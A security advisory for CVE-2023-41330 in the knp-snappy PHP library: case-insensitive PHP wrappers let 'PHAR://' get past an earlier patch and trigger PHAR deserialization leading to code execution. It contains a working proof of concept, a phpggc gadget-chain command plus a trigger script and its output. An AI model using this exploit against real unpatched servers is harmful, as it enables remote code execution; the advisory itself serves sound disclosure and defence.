# [C] Snappy PHAR deserialization vulnerability

## Summary
Severity: Critical
Advisory: GHSA-92rv-4j2h-8mjj
CVE: CVE-2023-41330
CWE: CWE-502
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2023-09-08
Source: https://github.com/advisories/GHSA-92rv-4j2h-8mjj
Type: github-advisory

## Affected
- Packagist: `knplabs/knp-snappy` — affected >=0 <1.4.3

## Details
## Issue

On March 17th the vulnerability [CVE-2023-28115 was disclosed](https://github.com/KnpLabs/snappy/security/advisories/GHSA-gq6w-q6wh-jggc), allowing an attacker to gain remote code execution through PHAR deserialization. To fix this issue, the version 1.4.2 was released with an additional check in the affected function to prevent the usage of the `phar://` wrapper. However, because PHP wrappers are case-insensitive and the patch only checks the presence of the `phar://` string, it can be bypassed to achieve remote code execution again using a different case.

As for the initial vulnerability, PHP 7 or below is required for a successful exploitation using the deserialization of PHP archives metadata via the `phar://` wrapper.

## Technical details

### Description

The following [patch](https://github.com/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6) was committed on the 1.4.2 release to fix CVE-2023-28115.

![patch](https://user-images.githubusercontent.com/110113034/250088710-396f562d-d19e-43a5-a8f8-90ca1f7e3e98.png)

If the user is able to control the second parameter of the `generateFromHtml()` function of Snappy, it will then be passed as the `$filename` parameter in the `prepareOutput()` function. In the original vulnerability, a file name with a `phar://` wrapper could be sent to the `fileExists()` function, equivalent to the `file_exists()` PHP function. This allowed users to trigger a deserialization on arbitrary PHAR files.

To fix this issue, the string is now passed to the `strpos()` function and if it starts with `phar://`, an exception is raised. However, PHP wrappers being case insensitive, this patch can be bypassed using `PHAR://` instead of `phar://`.

### Proof of Concept

To illustrate the vulnerability, the `/tmp/exploit` file will be written to the filesystem using a voluntarily added library to trigger the deserialization. The PHP archive is generated using [phpggc](https://github.com/ambionics/phpggc) with the `-f` option to force a fast destruct on the object. Otherwise, the PHP flow will stop on the first exception and the object destruction will not be called.

```bash
$ phpggc -f Monolog/RCE1 exec 'touch /tmp/exploit' -p phar -o exploit.phar
```
The following `index.php` file will be used to trigger the vulnerability via the payload `PHAR://exploit.phar`.

```bash
<?php
// index.php

// include autoloader
require __DIR__ . '/vendor/autoload.php';

// reference the snappy namespace
use Knp\Snappy\Pdf;

$snappy = new Pdf('/usr/local/bin/wkhtmltopdf');
$snappy->generateFromHtml('<h1>POC</h1>', 'PHAR://exploit.phar');
```
Finally once executed, the `/tmp/exploit` file is successfully created on the filesystem.

```bash
$ php index.php 
Fatal error: Uncaught InvalidArgumentException: The output file 'PHAR://exploit.phar' already exists and it is a directory. in /var/www/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php:634
Stack trace:
#0 /var/www/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php(178): Knp\Snappy\AbstractGenerator->prepareOutput('PHAR://exploit.phar', false)
#1 /var/www/vendor/knplabs/knp-snappy/src/Knp/Snappy/Pdf.php(36): Knp\Snappy\AbstractGenerator->generate(Array, 'PHAR://exploit.phar', Array, false)
#2 /var/www/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php(232): Knp\Snappy\Pdf->generate(Array, 'PHAR://exploit.phar', Array, false)
#3 /var/www/index.php(12): Knp\Snappy\AbstractGenerator->generateFromHtml('<h1>POC</h1>', 'PHAR://exploit.phar')
#4 {main}
  thrown in /var/www/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php on line 634
  
$ ls -l /tmp/exploit
-rw-r--r-- 1 user_exploit user_exploit 0 Jun 14 10:05 exploit
```

This proof of concept is based on the original one published with CVE-2023-28115.

### Impact

A successful exploitation of this vulnerability allows executing arbitrary code and accessing the underlying filesystem. The attacker must be able to upload a file and the server must be running a PHP version prior to 8.

## Patches
Synacktiv recommends to use a whitelist instead of a blacklist. In this situation, only the wrappers `http://`, `https://` or `file://` be available on the function `generateFromHtml()`.

## Workarounds
Control user data submitted to the function `AbstractGenerator->generate(...)`

## References
https://github.com/KnpLabs/snappy/security/advisories/GHSA-gq6w-q6wh-jggc

## Credits
Rémi Matasse of Synacktiv (https://synacktiv.com/).

## References
- https://github.com/KnpLabs/snappy/security/advisories/GHSA-92rv-4j2h-8mjj
- https://github.com/KnpLabs/snappy/security/advisories/GHSA-gq6w-q6wh-jggc
- https://nvd.nist.gov/vuln/detail/CVE-2023-41330
- https://github.com/KnpLabs/snappy/commit/d3b742d61a68bf93866032c2c0a7f1486128b67e
- https://github.com/FriendsOfPHP/security-advisories/blob/master/knplabs/knp-snappy/CVE-2023-41330.yaml
- https://github.com/KnpLabs/snappy
- https://github.com/advisories/GHSA-92rv-4j2h-8mjj
